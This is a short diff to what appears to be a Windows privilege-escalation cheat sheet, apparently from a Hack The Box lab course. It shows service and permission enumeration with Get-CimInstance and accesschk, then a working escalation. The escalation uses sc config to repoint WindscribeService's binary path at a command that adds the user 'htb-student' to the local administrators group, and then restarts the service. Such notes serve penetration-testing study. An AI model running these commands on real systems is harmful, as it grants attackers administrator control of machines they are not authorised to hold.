@@ -361,7 +361,8 @@ Get-UnquotedService
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
-accesschk.exe /accepteula -quvcw ServiceName | accesschk.exe /accepteula -uwcqv "Authenticated Users" * | accesschk.exe /accepteula -uwcqv "Users" * 
+accesschk.exe /accepteula -quvcw ServiceName | accesschk.exe /accepteula -uwcqv "Authenticated Users" * | accesschk.exe /accepteula -uwcqv "Users" *
+If there is Service_Change_Config Permission
 sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
 sc stop WindscribeService
 sc start WindscribeService
